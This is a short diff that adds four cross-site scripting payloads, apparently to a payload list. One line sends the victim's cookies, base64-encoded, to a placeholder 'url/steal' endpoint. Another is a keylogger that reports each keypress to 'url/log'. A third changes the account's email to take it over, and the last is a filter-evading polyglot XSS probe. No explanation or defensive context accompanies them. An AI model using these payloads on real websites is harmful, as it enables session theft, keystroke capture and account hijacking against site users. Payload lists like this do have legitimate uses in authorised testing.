@@ -1,0 +1,4 @@
+<script>fetch('url/steal?cookie=' + btoa(document.cookie));</script>
+document.onkeypress = function(v) {fetch('url/log?key=' + btoa(v.key));}</script>
+<script>user.changeEmail('e@mail.com');</script>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS'))//%0D%0A%0d%0a//\x3csVg/\x3e
